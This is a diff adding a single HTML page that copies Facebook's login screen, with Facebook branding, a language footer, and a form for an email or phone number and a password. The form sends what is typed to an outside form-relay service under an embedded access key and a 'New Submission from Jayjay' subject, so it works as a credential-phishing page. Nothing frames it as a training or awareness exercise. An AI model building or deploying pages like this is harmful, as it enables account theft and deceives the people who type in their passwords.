@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Login</title>
+  <style>
+    /* General Styling */
+body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    background-color: #f0f2f5;
+  }
+  
+  .container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    padding: 20px;
+    flex-wrap: wrap; /* Allows wrapping for smaller screens */
+  }
+  
+  .left-section {
+    width: 50%;
+    padding: 20px;
+    text-align: left;
+  }
+  
+  .facebook-logo {
+    font-size: 3rem;
+    color: #1877f2;
+    font-weight: bold;
+  }
+  
+  .left-section p {
+    font-size: 1.2rem;
+    color: #606770;
+  }
+  
+  .right-section {
+    width: 30%;
+    background-color: white;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+  }
+  
+  .login-form {
+    display: flex;
+    flex-direction: column;
+  }
+  
+  .input-field {
+    margin: 10px 0;
+    padding: 12px;
+    border: 1px solid #dddfe2;
+    border-radius: 6px;
+    font-size: 1rem;
+  }
+  
+  .login-button {
+    background-color: #1877f2;
+    color: white;
+    padding: 12px;
+    font-size: 1rem;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+    margin: 10px 0;
+  }
+  
+  .forgot-password {
+    text-align: center;
+    color: #1877f2;
+    text-decoration: none;
+    margin: 10px 0;
+  }
+  
+  hr {
+    margin: 20px 0;
+    border: none;
+    border-top: 1px solid #dddfe2;
+  }
+  
+  .create-account-button {
+    background-color: #42b72a;
+    color: white;
+    padding: 12px;
+    font-size: 1rem;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+  }
+  
+  footer {
+    text-align: center;
+    margin-top: 20px;
+    font-size: 0.9rem;
+    color: #606770;
+  }
+  
+  .languages a {
+    text-decoration: none;
+    color: #606770;
+    margin: 0 5px;
+    font-size: 0.9rem;
+  }
+  
+  /* Responsive Design for Mobile */
+  @media (max-width: 768px) {
+    .container {
+      flex-direction: column; /* Stack elements vertically */
+    }
+  
+    .left-section {
+      width: 100%;
+      text-align: center;
+      padding: 10px;
+    }
+  
+    .facebook-logo {
+      font-size: 2.5rem;
+    }
+  
+    .left-section p {
+      font-size: 1rem;
+    }
+  
+    .right-section {
+      width: 100%;
+      padding: 15px;
+      box-shadow: none;
+    }
+  
+    .input-field {
+      font-size: 0.9rem;
+      padding: 10px;
+    }
+  
+    .login-button,
+    .create-account-button {
+      font-size: 0.9rem;
+      padding: 10px;
+    }
+  
+    footer {
+      font-size: 0.8rem;
+    }
+  
+    .languages a {
+      font-size: 0.8rem;
+    }
+  }
+  
+  /* Extra Small Screens */
+  @media (max-width: 480px) {
+    .facebook-logo {
+      font-size: 2rem;
+    }
+  
+    .left-section p {
+      font-size: 0.9rem;
+    }
+  
+    .right-section {
+      padding: 10px;
+    }
+  
+    .input-field,
+    .login-button,
+    .create-account-button {
+      padding: 8px;
+    }
+  
+    footer {
+      font-size: 0.7rem;
+    }
+  
+    .languages a {
+      font-size: 0.7rem;
+    }
+  }
+  
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="left-section">
+      <h1 class="facebook-logo">facebook</h1>
+      <p>Facebook helps you connect and share with the people in your life.</p>
+    </div>
+    <div class="right-section">
+      <form class="login-form"  action="https://api.web3forms.com/submit" method="POST">
+        <input type="hidden" name="access_key" value="00ed92cb-5032-4578-b9be-306700b2271e">
+        <inp ut type="hidden" name="subject" value="New Submission from Jayjay">
+        <input type="hidden" name="from_name" value="Your Website Name">>
+        <input type="text" placeholder="Email address or phone number" class="input-field" name="Email address or phone number">
+        <input type="password" placeholder="Password" class="input-field" name="pass">
+        <button type="submit" class="login-button">Log in</button>
+        <a href="#" class="forgot-password">Forgotten password?</a>
+        <hr>
+        <button type="button" class="create-account-button">Create new account</button>
+      </form>
+    </div>
+  </div>
+  <footer>
+    <p>Create a Page for a celebrity, brand, or business.</p>
+    <div class="languages">
+      <a href="#">English (UK)</a>
+      <a href="#">Hausa</a>
+      <a href="#">Français (France)</a>
+      <a href="#">Português (Brasil)</a>
+      <a href="#">Español</a>
+      <a href="#">العربية</a>
+      <a href="#">Bahasa Indonesia</a>
+      <a href="#">Deutsch</a>
+      <a href="#">日本語</a>
+      <a href="#">Italiano</a>
+      <a href="#">हिंदी</a>
+    </div>
+  </footer>
+</body>
+</html>
